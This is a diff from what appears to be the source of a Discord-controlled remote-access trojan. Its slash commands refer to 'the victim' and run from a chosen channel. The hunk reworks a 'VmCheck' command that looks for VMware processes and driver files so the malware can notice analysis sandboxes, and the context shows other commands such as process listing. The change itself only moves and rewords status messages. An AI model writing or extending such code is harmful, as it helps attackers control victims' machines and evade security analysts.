@@ -1217,12 +1217,13 @@ async def listProccess_command(ctx: SlashContext):
 @slash.slash(name="VmCheck", description="Detect if the victim is using a VM", guild_ids=g)
 async def VmCheck_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
+        await ctx.send("Scanning System for Vm Drivers. . .")
+
         sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=35, cols=170))
 
         FOUND = False
         FOUND_DRIVER = False
 
-        await ctx.send("Scanning System for Vm Process")
         time.sleep(2)
         VmCehck1 = "vmsrvc.exe"
         VmCehck2 = "vmusrvc.exe"
@@ -1261,14 +1262,12 @@ async def VmCheck_command(ctx: SlashContext):
                     FOUND = True
                 else:
                     shit = 12
-
             except AccessDenied:
                 await ctx.send("[!] Perimission Denied")
         if FOUND == True:
             await ctx.send("Found a VM Process!")
             return
 
-        await ctx.send("Scanning System For VM Drivers")
         vmci = os.path.exists("C:\WINDOWS\system32\drivers\vmci.sys")
         vmhgfs = os.path.exists("C:\WINDOWS\system32\drivers\vmhgfs.sys")
         vmmouse = os.path.exists("C:\WINDOWS\system32\drivers\vmmouse.sys")
@@ -1316,7 +1315,9 @@ async def VmCheck_command(ctx: SlashContext):
         if FOUND_DRIVER == True:
             await ctx.send("Found a VM Driver!")
             return
-        await ctx.send("Finished checking for VM")
+        else:
+            await ctx.send("Finished checking for VM No Drivers found")
+        
 
 client.run(token)
 
